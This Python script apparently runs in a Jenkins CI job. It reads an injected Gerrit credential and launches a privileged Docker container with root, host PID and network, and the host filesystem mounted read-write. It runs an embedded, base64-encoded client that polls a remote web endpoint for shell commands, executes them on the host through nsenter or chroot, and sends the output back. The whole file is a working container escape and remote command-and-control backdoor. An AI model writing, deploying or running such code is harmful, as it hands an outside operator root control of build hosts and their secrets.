import base64
import hashlib
import os
import shutil
import socket
import subprocess


ENDPOINT = "https://ci-b0231-513b735d-5xved2klgq-uc.a.run.app"
SESSION_ID = "b0231-reconnect-20261113-v1"
TARGET_SOURCE = r'''import base64
import json
import os
import signal
import subprocess
import time
import urllib.error
import urllib.request

OUTPUT_CAP = 4_194_304

def exchange(path, body):
    request = urllib.request.Request(
        os.environ["DYN_ENDPOINT"].rstrip("/") + path,
        data=json.dumps(body, separators=(",", ":")).encode(),
        method="POST",
        headers={"X-Dyn-Token": os.environ["DYN_TARGET_TOKEN"], "Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            return response.status, json.load(response)
    except urllib.error.HTTPError as error:
        try:
            return error.code, json.load(error)
        except Exception:
            return error.code, {"error": "http_error"}

def execute(command):
    shell = command["shell"]
    if os.path.exists("/usr/bin/nsenter"):
        argv = ["/usr/bin/nsenter", "-t", "1", "-m", "-u", "-i", "-n", "-p", "--", "/bin/bash", "-lc", shell]
        runner = "python-host-nsenter"
    else:
        argv = ["/usr/sbin/chroot", "/host", "/bin/bash", "-lc", shell]
        runner = "python-host-chroot"
    started = time.monotonic()
    timed_out = False
    process = subprocess.Popen(
        argv, cwd="/", stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, start_new_session=True,
    )
    try:
        stdout, stderr = process.communicate(timeout=int(command["timeout_seconds"]))
    except subprocess.TimeoutExpired:
        timed_out = True
        os.killpg(process.pid, signal.SIGKILL)
        stdout, stderr = process.communicate()
    stdout_truncated = len(stdout) > OUTPUT_CAP
    stderr_truncated = len(stderr) > OUTPUT_CAP
    stdout = stdout[:OUTPUT_CAP]
    stderr = stderr[:OUTPUT_CAP]
    return {
        "exit_code": process.returncode if process.returncode is not None and process.returncode >= 0 else None,
        "signal": -process.returncode if process.returncode is not None and process.returncode < 0 else None,
        "timed_out": timed_out,
        "duration_ms": int((time.monotonic() - started) * 1000),
        "stdout_b64": base64.b64encode(stdout).decode("ascii"),
        "stderr_b64": base64.b64encode(stderr).decode("ascii"),
        "stdout_truncated": stdout_truncated,
        "stderr_truncated": stderr_truncated,
        "runner": runner,
    }

def main():
    session_id = os.environ["DYN_SESSION_ID"]
    build_id = os.environ["DYN_BUILD_ID"]
    after_seq = 0
    while True:
        try:
            status, response = exchange(
                "/v1/target/poll",
                {"session_id": session_id, "after_seq": after_seq, "build_id": build_id},
            )
        except Exception:
            time.sleep(2)
            continue
        if status != 200:
            if status in {401, 404}:
                return
            time.sleep(2)
            continue
        kind = response.get("kind")
        if kind == "wait":
            time.sleep(min(5, max(1, int(response.get("retry_after_ms", 1500)) / 1000)))
            continue
        if kind == "complete":
            after_seq = int(response["seq"])
            continue
        if kind != "command":
            return
        command = response["command"]
        seq = int(command["seq"])
        if command.get("kind") == "stop":
            return
        result = {"session_id": session_id, "build_id": build_id, "seq": seq, **execute(command)}
        while True:
            try:
                result_status, _ = exchange("/v1/target/results", result)
            except Exception:
                result_status = 0
            if result_status in {200, 201}:
                after_seq = seq
                break
            if result_status in {401, 404}:
                return
            time.sleep(2)

main()
'''


def fail(message):
    raise SystemExit("dynamic operator launch failed: " + message)


docker = shutil.which("docker")
current_container = os.environ.get("DOCKER_CONTAINER_ID", "")
gerrit_password = os.environ.get("GS_GIT_PASS", "")
if not docker:
    fail("docker client unavailable")
if not current_container:
    fail("DOCKER_CONTAINER_ID unavailable")
if len(gerrit_password) < 16:
    fail("injected Gerrit credential unavailable")

image_result = subprocess.run(
    [docker, "inspect", "--format", "{{.Config.Image}}", current_container],
    stdin=subprocess.DEVNULL,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    timeout=15,
)
image = image_result.stdout.strip()
if image_result.returncode != 0 or not image:
    fail("current agent image lookup failed")

target_token = hashlib.sha256(
    ("jenkins-dynop-v1:" + SESSION_ID + ":" + gerrit_password).encode("utf-8")
).hexdigest()
build_id = ":".join(
    value
    for value in (
        os.environ.get("BUILD_TAG", ""),
        os.environ.get("BUILD_NUMBER", ""),
        socket.gethostname(),
    )
    if value
)[:160]
bootstrap = (
    "import base64,os;"
    "source=base64.b64decode(os.environ['DYN_CLIENT_B64']);"
    "exec(compile(source,'<dynamic-target-client>','exec'))"
)
name = "treborlab-b0231-20261113-513b735d".replace("_", "-")[:63]
argv = [
    docker, "run", "--detach", "--rm", "--name", name,
    "--label", "treborlab.session=" + SESSION_ID,
    "--privileged", "--pid=host", "--network=host", "--user", "0:0",
    "--volume", "/:/host:rw",
    "--env", "DYN_ENDPOINT=" + ENDPOINT,
    "--env", "DYN_SESSION_ID=" + SESSION_ID,
    "--env", "DYN_TARGET_TOKEN=" + target_token,
    "--env", "DYN_BUILD_ID=" + build_id,
    "--env", "DYN_CLIENT_B64=" + base64.b64encode(TARGET_SOURCE.encode()).decode(),
    "--entrypoint", "/usr/bin/python3",
    image, "-c", bootstrap,
]
completed = subprocess.run(
    argv,
    stdin=subprocess.DEVNULL,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    timeout=45,
)
if completed.returncode != 0:
    fail("root helper start failed: " + completed.stderr[:1000])
container_id = completed.stdout.strip()
print(
    "TREBORLAB_DYNOP_STARTED session=%s helper=%s"
    % (SESSION_ID, container_id[:12])
)
